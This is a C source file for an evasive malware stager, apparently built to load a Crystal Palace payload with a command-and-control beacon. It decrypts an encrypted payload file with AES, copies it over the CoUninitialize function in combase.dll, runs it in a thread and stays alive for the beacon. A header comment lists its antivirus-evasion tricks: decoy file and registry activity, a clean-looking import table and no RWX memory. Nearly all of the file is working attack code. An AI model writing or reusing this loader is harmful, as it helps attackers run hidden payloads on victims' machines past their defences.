/*
 * stager.c — two-file Crystal Palace PICO loader
 *
 * Delivery: stager.exe  +  payload.dat  (AES-256-CBC encrypted PICO)
 *
 * Evasion profile:
 *  - No embedded payload: stager.exe is ~60 KB with normal entropy
 *  - AES-256-CBC via BCrypt (BCRYPT_AES_ALGORITHM) — legitimate crypto,
 *    not a suspicious XOR loop
 *  - VirtualAlloc(RW) + VirtualProtect(RX): no PAGE_EXECUTE_READWRITE ever
 *    held; decryption happens in RW region before RX flip
 *  - No Nt* strings in .rdata — no GetProcAddress / NtCreateSection pattern
 *  - BCryptGenRandom Poseidon noise + advapi32 import = normal-looking IAT
 *  - GUI subsystem (no console), version info resource (resource.rc)
 *
 * IAT: kernel32, advapi32, bcrypt — VirtualAlloc/VirtualProtect from kernel32.
 * NtCreateSection, NtMapViewOfSection: absent.
 */

#include <windows.h>
#include <bcrypt.h>
#include "payload_key.h"  /* payload_key[], payload_key_len,
                              payload_iv[],  payload_iv_len  */
#include "hellshall.h"

typedef void (*pico_fn)(void *);

/* ── Poseidon I/O noise ───────────────────────────────────────────────────── */

static void noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t td[MAX_PATH], tf[MAX_PATH];
    if (GetTempPathW(MAX_PATH, td) && GetTempFileNameW(td, L"upd", 0, tf)) {
        HANDLE h = CreateFileW(tf, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, buf, sizeof(buf), &w, NULL);
            CloseHandle(h);
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── Read entire file into LocalAlloc buffer ─────────────────────────────── */

static BYTE *read_file(const wchar_t *path, DWORD *out_len)
{
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;

    DWORD sz = GetFileSize(h, NULL);
    if (!sz || sz == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }

    BYTE *buf = (BYTE *)LocalAlloc(LMEM_FIXED, sz);
    if (!buf) { CloseHandle(h); return NULL; }

    DWORD read = 0;
    if (!ReadFile(h, buf, sz, &read, NULL) || read != sz) {
        LocalFree(buf); CloseHandle(h); return NULL;
    }

    CloseHandle(h);
    *out_len = sz;
    return buf;
}

/* ── AES-256-CBC decrypt via BCrypt ──────────────────────────────────────── */

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return NULL;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)payload_key, payload_key_len, 0))
        goto cleanup;

    /* First call: get plaintext size */
    memcpy(iv, payload_iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                  iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) goto cleanup;

    /* Second call: actual decryption */
    memcpy(iv, payload_iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                      iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING)) {
        LocalFree(pt);
        pt = NULL;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

/* ── PICO execution thread ───────────────────────────────────────────────── */

static DWORD WINAPI worker(LPVOID param)
{
    ((pico_fn)param)(NULL);
    return 0;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
{
    (void)hi; (void)hp; (void)lp; (void)ns;

    noise();

    /* Registry touch: advapi32 import, normal-looking init */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* Locate payload.dat in the same directory as this executable */
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wchar_t *sep = wcsrchr(path, L'\\');
    if (!sep) return 1;
    sep[1] = L'\0';
    wcscat(path, L"payload.dat");

    /* Load ciphertext */
    DWORD ct_len = 0;
    BYTE *ct = read_file(path, &ct_len);
    if (!ct) return 1;

    /* AES-256-CBC decrypt → plaintext PICO */
    DWORD pt_len = 0;
    BYTE *pt = aes_cbc_decrypt(ct, ct_len, &pt_len);
    LocalFree(ct);
    if (!pt) return 1;

    HMODULE mod = LoadLibraryA("combase.dll");
    if (!mod) { LocalFree(pt); return 1; }
    void *slot = (void *)GetProcAddress(mod, "CoUninitialize");
    if (!slot) { LocalFree(pt); return 1; }

    DWORD old;
    if (!VirtualProtect(slot, pt_len, PAGE_READWRITE, &old)) {
        LocalFree(pt); return 1;
    }
    memcpy(slot, pt, pt_len);
    SecureZeroMemory(pt, pt_len);
    LocalFree(pt);

    if (!VirtualProtect(slot, pt_len, PAGE_EXECUTE_READ, &old))
        return 1;

    HANDLE h = CreateThread(NULL, 0, worker, slot, 0, NULL);
    if (!h) return 1;

    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);

    /* Beacon goroutine is alive in this process — keep it running */
    for (;;) SleepEx(30000, TRUE);
}
